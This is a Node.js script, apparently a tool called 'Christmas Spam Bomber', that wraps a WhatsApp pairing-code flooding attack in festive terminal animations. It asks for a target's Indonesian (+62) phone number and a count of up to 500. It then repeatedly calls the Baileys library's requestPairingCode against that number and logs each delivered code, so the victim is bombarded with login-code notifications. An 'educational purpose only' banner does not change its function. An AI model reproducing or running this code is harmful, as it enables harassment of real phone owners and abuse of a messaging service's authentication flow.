const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const colors = {
    red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m', blue: '\x1b[34m',
    magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m', gray: '\x1b[90m',
    reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m', blink: '\x1b[5m',
    bgRed: '\x1b[41m', bgGreen: '\x1b[42m', bgYellow: '\x1b[43m', bgBlue: '\x1b[44m'
};

const christmasColors = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[36m', '\x1b[35m', '\x1b[91m', '\x1b[92m', '\x1b[93m'];
const snowflakes = ['❄️', '🌨️', '✨', '⭐', '🌟', '💠', '🔶', '🔷', '🎄', '🎅', '🤶', '🦌', '🎁', '🔔', '🎶'];

class ChristmasAnimator {
    constructor() { this.intervals = []; this.timeouts = []; this.snow = []; }
    
    clearAll() { 
        this.intervals.forEach(clearInterval); 
        this.timeouts.forEach(clearTimeout); 
        this.intervals = []; 
        this.timeouts = []; 
    }
    
    snowAnimation(duration = 5000) {
        return new Promise((resolve) => {
            const width = process.stdout.columns || 80;
            const height = 20;
            
            for (let i = 0; i < 50; i++) {
                this.snow.push({
                    x: Math.random() * width,
                    y: Math.random() * -height,
                    speed: 0.5 + Math.random() * 1.5,
                    flake: snowflakes[Math.floor(Math.random() * snowflakes.length)]
                });
            }
            
            const startTime = Date.now();
            const interval = setInterval(() => {
                console.clear();
                
                console.log(colors.bgBlue + ' '.repeat(width) + colors.reset);
                
                for (let i = 0; i < this.snow.length; i++) {
                    this.snow[i].y += this.snow[i].speed;
                    this.snow[i].x += Math.sin(this.snow[i].y * 0.1) * 0.5;
                    
                    if (this.snow[i].y > height) {
                        this.snow[i].y = -5;
                        this.snow[i].x = Math.random() * width;
                    }
                    
                    const x = Math.floor(this.snow[i].x);
                    const y = Math.floor(this.snow[i].y);
                    
                    if (y >= 0 && y < height) {
                        readline.cursorTo(process.stdout, x, y + 2);
                        const color = christmasColors[Math.floor(Math.random() * christmasColors.length)];
                        process.stdout.write(color + this.snow[i].flake + colors.reset);
                    }
                }
                
                if (Date.now() - startTime > duration) {
                    clearInterval(interval);
                    console.clear();
                    this.snow = [];
                    resolve();
                }
            }, 100);
            this.intervals.push(interval);
        });
    }
    
    christmasTreeAnimation() {
        return new Promise((resolve) => {
            const tree = [
                '         🎄         ',
                '        🎄🎄🎄        ',
                '       🎄🎄🎄🎄🎄       ',
                '      🎄🎄🎄🎄🎄🎄🎄      ',
                '     🎄🎄🎄🎄🎄🎄🎄🎄🎄     ',
                '    🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄    ',
                '        🎁🎁🎁        ',
                '        🎁🎁🎁        '
            ];
            
            let lightsOn = false;
            let frame = 0;
            const interval = setInterval(() => {
                console.clear();
                console.log(colors.green + '\n' + '🎅'.repeat(25) + colors.reset);
                console.log(colors.red + '         MERRY CHRISTMAS SPAM!         ' + colors.reset);
                console.log(colors.green + '🎅'.repeat(25) + colors.reset + '\n');
                
                for (let i = 0; i < tree.length; i++) {
                    let line = tree[i];
                    if (lightsOn) {
                        line = line.replace(/🎄/g, '🎄').replace(/🎁/g, '🎁');
                    }
                    const color = i < 6 ? colors.green : colors.red;
                    console.log(' '.repeat(20) + color + line + colors.reset);
                }
                
                console.log('\n' + colors.yellow + '🎶 SPAMMING PAIRING CODES WITH CHRISTMAS SPIRIT! 🎶' + colors.reset);
                
                lightsOn = !lightsOn;
                frame++;
                
                if (frame > 10) {
                    clearInterval(interval);
                    resolve();
                }
            }, 300);
            this.intervals.push(interval);
        });
    }
    
    santaSleighAnimation() {
        return new Promise((resolve) => {
            const sleigh = [
                '     🎅__👑',
                '    / \\🎁\\',
                '   /   \\__\\',
                '  /🦌  🦌  \\',
                ' /__________\\',
                '   🔔   🔔'
            ];
            
            let pos = -20;
            const width = 60;
            const interval = setInterval(() => {
                console.clear();
                console.log(colors.red + '\n' + '✨'.repeat(width) + colors.reset);
                
                for (let i = 0; i < sleigh.length; i++) {
                    const line = ' '.repeat(Math.max(0, pos)) + sleigh[i];
                    const color = christmasColors[i % christmasColors.length];
                    console.log(color + line + colors.reset);
                }
                
                console.log(colors.white + '\n' + '~'.repeat(width) + colors.reset);
                console.log(colors.green + '🎄 Santa is delivering SPAM codes! 🎄' + colors.reset);
                console.log(colors.red + '🎁 Each code is a Christmas gift! 🎁' + colors.reset);
                
                pos += 2;
                if (pos > width + 10) {
                    clearInterval(interval);
                    resolve();
                }
            }, 100);
            this.intervals.push(interval);
        });
    }
    
    fireworksAnimation() {
        return new Promise((resolve) => {
            const particles = [];
            for (let i = 0; i < 100; i++) {
                particles.push({
                    x: 30,
                    y: 10,
                    vx: (Math.random() - 0.5) * 4,
                    vy: (Math.random() - 0.5) * 4,
                    life: 20 + Math.random() * 30,
                    char: ['✨', '🌟', '⭐', '🎆', '🎇', '💥'][Math.floor(Math.random() * 6)]
                });
            }
            
            let frame = 0;
            const interval = setInterval(() => {
                console.clear();
                console.log(colors.yellow + '\n' + '🎆'.repeat(20) + ' FIREWORKS CELEBRATION ' + '🎆'.repeat(20) + colors.reset);
                
                const grid = Array(20).fill().map(() => Array(60).fill(' '));
                
                particles.forEach(p => {
                    p.x += p.vx;
                    p.y += p.vy;
                    p.life--;
                    p.vy += 0.1;
                    
                    const x = Math.floor(p.x);
                    const y = Math.floor(p.y);
                    
                    if (x >= 0 && x < 60 && y >= 0 && y < 20 && p.life > 0) {
                        grid[y][x] = p.char;
                    }
                });
                
                for (let y = 0; y < 20; y++) {
                    let line = '';
                    for (let x = 0; x < 60; x++) {
                        if (grid[y][x] !== ' ') {
                            const color = christmasColors[Math.floor(Math.random() * christmasColors.length)];
                            line += color + grid[y][x] + colors.reset;
                        } else {
                            line += ' ';
                        }
                    }
                    console.log(line);
                }
                
                console.log(colors.green + '\n🎉 SPAM SUCCESSFUL! 🎉' + colors.reset);
                
                frame++;
                if (frame > 50) {
                    clearInterval(interval);
                    resolve();
                }
            }, 50);
            this.intervals.push(interval);
        });
    }
    
    sendChristmasNotification(title, message, type = 'info') {
        const icons = {
            success: '✅🎄',
            error: '❌🎅',
            warning: '⚠️🔔',
            info: 'ℹ️🎁',
            spam: '📨✨'
        };
        
        const color = type === 'success' ? colors.green : 
                     type === 'error' ? colors.red : 
                     type === 'warning' ? colors.yellow : 
                     type === 'spam' ? colors.magenta : colors.cyan;
        
        const border = '━'.repeat(48);
        console.log('\n' + color + '┏' + border + '┓');
        console.log('┃ ' + icons[type] + ' ' + title.padEnd(44) + ' ┃');
        console.log('┣' + border + '┫');
        console.log('┃ ' + message.padEnd(46) + ' ┃');
        console.log('┗' + border + '┛' + colors.reset);
    }
    
    createProgressBar(current, total, label = '') {
        const width = 40;
        const percent = Math.min(current / total, 1);
        const filled = Math.floor(width * percent);
        const empty = width - filled;
        
        const bar = colors.green + '█'.repeat(filled) + colors.white + '░'.repeat(empty) + colors.reset;
        const percentText = Math.floor(percent * 100);
        
        const spinner = ['🎄', '🎅', '🤶', '🦌', '🎁', '🔔'][current % 6];
        
        console.log(colors.cyan + `\n${spinner} ${bar} ${percentText}% ${label}` + colors.reset);
    }
    
    typewriter(text, delay = 25) {
        return new Promise((resolve) => {
            let i = 0;
            const type = () => {
                if (i < text.length) {
                    const color = christmasColors[i % christmasColors.length];
                    process.stdout.write(color + text[i] + colors.reset);
                    i++;
                    this.timeouts.push(setTimeout(type, delay));
                } else {
                    process.stdout.write('\n');
                    resolve();
                }
            };
            type();
        });
    }
}

const anim = new ChristmasAnimator();

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { 
        rl.question(colors.cyan + text + colors.reset, (answer) => { rl.close(); resolve(answer); });
    });
};

async function showChristmasIntro() {
    console.clear();
    
    await anim.snowAnimation(3000);
    await anim.christmasTreeAnimation();
    await anim.santaSleighAnimation();
    
    console.clear();
    
    console.log(colors.red + '\n' + '🎄'.repeat(35));
    console.log('🎄'.repeat(35) + colors.reset);
    
    console.log(colors.green);
    console.log('   ░█▀▀░█▀█░█▀▄░█▀▀░█▀█░▀█▀░█▀█░█▀▄░█▀▀░░░█▀█░█▀▄░█▀▄░█▀▀');
    console.log('   ░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░█▀▄░█▀▀░░░█▀▀░█▀▄░█▀▄░█▀▀');
    console.log('   ░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░▀░░▀░▀░▀░▀░▀▀▀░░░▀░░░▀░▀░▀░▀░▀▀▀');
    console.log(colors.reset);
    
    console.log(colors.blue);
    console.log('   ░█▀▀░█▀█░█▀▄░█▀▀░█▀█░▀█▀░█▀█░█▀▄░█▀▀░░░█▀▀░█▀▄░█▀▀░█▀█');
    console.log('   ░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░█▀▄░█▀▀░░░█▀▀░█▀▄░█░█░█░█');
    console.log('   ░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░▀░░▀░▀░▀░▀░▀▀▀░░░▀▀▀░▀░▀░▀▀▀░▀░▀');
    console.log(colors.reset);
    
    console.log(colors.red + '\n' + '🎄'.repeat(35));
    console.log('🎄'.repeat(35) + colors.reset);
    
    anim.sendChristmasNotification('CHRISTMAS SPAM BOMBER', 'Special Holiday Edition v6.6', 'warning');
    
    await anim.typewriter(colors.green + '   🎅 CREATED BY: FLOWFALCON WITH ❤️' + colors.reset);
    await anim.typewriter(colors.cyan + '   🎄 RENOVASI BY: RIM 🎁' + colors.reset);
    await anim.typewriter(colors.yellow + '   ⚠️  FOR EDUCATIONAL PURPOSE ONLY! 🦌' + colors.reset);
    
    anim.sendChristmasNotification('IMPORTANT', 'This tool works only with +62 numbers!', 'info');
    
    console.log('\n' + colors.magenta + '🔔'.repeat(35) + colors.reset);
    await anim.typewriter(colors.white + '   🎶 PRESS ENTER TO START CHRISTMAS SPAMMING...' + colors.reset);
    await question('');
    console.clear();
}

async function KleeProject() {
    await showChristmasIntro();
    
    anim.sendChristmasNotification('INITIALIZING', 'Loading Christmas spam modules...', 'info');
    
    try {
        const { state } = await useMultiFileAuthState('./69/session');
        const KleeBotInc = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: state,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 10000,
            emitOwnEvents: true,
            fireInitQueries: true,
            generateHighQualityLinkPreview: true,
            syncFullHistory: true,
            markOnlineOnConnect: true,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
        });
        
        anim.sendChristmasNotification('CONNECTED', 'Successfully connected to WhatsApp! ✅', 'success');
        
        console.log(colors.green + '\n' + '🎁'.repeat(25) + colors.reset);
        console.log(colors.red + '   🎅 CHRISTMAS TARGET SELECTION 🎅' + colors.reset);
        console.log(colors.green + '🎁'.repeat(25) + colors.reset + '\n');
        
        const phoneNumber = await question(colors.cyan + '   🎄 ENTER TARGET NUMBER (62xxxxxxxxxx): ' + colors.reset);
        
        if (!phoneNumber || !phoneNumber.startsWith('62')) {
            anim.sendChristmasNotification('ERROR', 'Number must start with 62! Example: 6281234567890', 'error');
            return;
        }
        
        const countInput = await question(colors.cyan + '   🎁 ENTER SPAM COUNT (1-500): ' + colors.reset);
        const spamCount = parseInt(countInput);
        
        if (isNaN(spamCount) || spamCount <= 0 || spamCount > 500) {
            anim.sendChristmasNotification('ERROR', 'Count must be between 1 and 500!', 'error');
            return;
        }
        
        anim.sendChristmasNotification('CONFIGURED', `Target: ${phoneNumber} | Count: ${spamCount}`, 'spam');
        
        console.clear();
        anim.sendChristmasNotification('SPAM STARTING', '🎄 Beginning Christmas spam attack! 🎄', 'warning');
        
        console.log(colors.red + '\n' + '🦌'.repeat(30));
        console.log('🦌'.repeat(30) + colors.reset);
        
        console.log(colors.yellow + `\n   🎯 TARGET: ${phoneNumber}` + colors.reset);
        console.log(colors.cyan + `   🔢 COUNT: ${spamCount} codes` + colors.reset);
        console.log(colors.green + `   ⏰ START TIME: ${new Date().toLocaleTimeString()}` + colors.reset);
        
        console.log(colors.red + '\n' + '🦌'.repeat(30));
        console.log('🦌'.repeat(30) + colors.reset);
        
        let successful = 0;
        let failed = 0;
        const deliveredCodes = [];
        const startTime = Date.now();
        
        for (let i = 0; i < spamCount; i++) {
            const current = i + 1;
            
            anim.createProgressBar(current, spamCount, `Spamming ${current}/${spamCount}`);
            
            try {
                anim.sendChristmasNotification(`ATTEMPT ${current}`, `Sending Christmas code to target...`, 'spam');
                
                const code = await KleeBotInc.requestPairingCode(phoneNumber);
                const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
                
                successful++;
                deliveredCodes.push({
                    number: current,
                    code: formattedCode,
                    original: code,
                    time: new Date().toLocaleTimeString()
                });
                
                anim.sendChristmasNotification(`SUCCESS ${current}`, `Code delivered: ${formattedCode}`, 'success');
                console.log(colors.green + `   ✅ [${current}/${spamCount}] ${formattedCode} - DELIVERED! 🎁` + colors.reset);
                
                const emojis = ['🎄', '🎅', '🤶', '🦌', '🎁', '🔔', '❄️', '✨'];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                console.log(colors.magenta + `   ${randomEmoji} Christmas spam is working! ${randomEmoji}` + colors.reset);
                
            } catch (error) {
                failed++;
                anim.sendChristmasNotification(`FAILED ${current}`, `Error: ${error.message}`, 'error');
                console.log(colors.red + `   ❌ [${current}/${spamCount}] FAILED: ${error.message}` + colors.reset);
            }
            
            const delay = 800 + Math.random() * 400;
            await new Promise(resolve => setTimeout(resolve, delay));
            
            if (current % 5 === 0) {
                const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                console.log(colors.blue + `   ⏱️  Elapsed: ${elapsed}s | Success: ${successful} | Failed: ${failed}` + colors.reset);
            }
        }
        
        const endTime = Date.now();
        const totalTime = ((endTime - startTime) / 1000).toFixed(2);
        
        console.clear();
        await anim.fireworksAnimation();
        
        anim.sendChristmasNotification('MISSION COMPLETE', `Christmas spam finished in ${totalTime} seconds!`, 'success');
        
        console.log(colors.green + '\n' + '🎅'.repeat(30));
        console.log('🎅'.repeat(30) + colors.reset);
        
        console.log(colors.yellow + '\n   🎄 CHRISTMAS SPAM REPORT 🎄' + colors.reset);
        console.log(colors.cyan + '   ┌' + '─'.repeat(46) + '┐' + colors.reset);
        console.log(colors.green + `   │ ✅ SUCCESSFUL: ${successful.toString().padStart(4)} codes${' '.repeat(25)}│` + colors.reset);
        console.log(colors.red + `   │ ❌ FAILED:     ${failed.toString().padStart(4)} codes${' '.repeat(25)}│` + colors.reset);
        console.log(colors.blue + `   │ 🎯 TOTAL:      ${spamCount.toString().padStart(4)} attempts${' '.repeat(23)}│` + colors.reset);
        console.log(colors.magenta + `   │ ⏰ DURATION:   ${totalTime}s${' '.repeat(32)}│` + colors.reset);
        const successRate = ((successful / spamCount) * 100).toFixed(2);
        console.log(colors.yellow + `   │ 📈 RATE:       ${successRate}% success${' '.repeat(25)}│` + colors.reset);
        console.log(colors.cyan + '   └' + '─'.repeat(46) + '┘' + colors.reset);
        
        if (deliveredCodes.length > 0) {
            anim.sendChristmasNotification('DELIVERY REPORT', `${deliveredCodes.length} codes delivered successfully!`, 'info');
            
            console.log(colors.cyan + '\n   🎁 SUCCESSFUL CODES DELIVERED:' + colors.reset);
            console.log(colors.white + '   ┌' + '─'.repeat(50) + '┐' + colors.reset);
            
            deliveredCodes.slice(0, 10).forEach((item, idx) => {
                const color = christmasColors[idx % christmasColors.length];
                console.log(color + `   │ ${item.number.toString().padStart(3)}. ${item.code.padEnd(15)} @ ${item.time} │` + colors.reset);
            });
            
            if (deliveredCodes.length > 10) {
                console.log(colors.magenta + `   │ ... and ${deliveredCodes.length - 10} more codes ...${' '.repeat(8)}│` + colors.reset);
            }
            
            console.log(colors.white + '   └' + '─'.repeat(50) + '┘' + colors.reset);
        }
        
        console.log(colors.green + '\n' + '🎅'.repeat(30));
        console.log('🎅'.repeat(30) + colors.reset);
        
        anim.sendChristmasNotification('CHRISTMAS MESSAGE', 'Merry Christmas and Happy Spamming! 🎄', 'success');
        
        console.log(colors.red + '\n   🎄 FINAL CHRISTMAS GREETINGS 🎄' + colors.reset);
        console.log(colors.green + '   🎅 Original by: FlowFalcon' + colors.reset);
        console.log(colors.cyan + '   🎁 Renovasi by: Rim' + colors.reset);
        console.log(colors.yellow + '   ⚠️  Educational use only!' + colors.reset);
        console.log(colors.magenta + '   ✨ Merry Christmas & Happy New Year! ✨' + colors.reset);
        
        console.log('\n' + colors.rainbow);
        for (let i = 0; i < 5; i++) {
            console.log('   🎄 '.repeat(10));
            console.log('   🎅 '.repeat(10));
            await new Promise(resolve => setTimeout(resolve, 400));
        }
        console.log(colors.reset);
        
        anim.sendChristmasNotification('THANK YOU', 'Thanks for using Christmas Spam Bomber! 🎁', 'info');
        
    } catch (error) {
        anim.sendChristmasNotification('SYSTEM ERROR', `Critical failure: ${error.message}`, 'error');
        console.log(colors.red + '\n   🎄 CHRISTMAS SPAM FAILED! 🎄' + colors.reset);
        console.log(colors.yellow + `   🔧 Error: ${error.message}` + colors.reset);
        console.log(colors.cyan + '   💡 Check your internet and session folder!' + colors.reset);
    }
    
    anim.clearAll();
}

process.on('SIGINT', () => {
    anim.clearAll();
    console.log(colors.red + '\n\n🎄 Christmas spam stopped by user! 🎄' + colors.reset);
    process.exit(0);
});

console.clear();
KleeProject().catch(err => {
    console.error(colors.red + 'FATAL ERROR: ' + err.message + colors.reset);
});
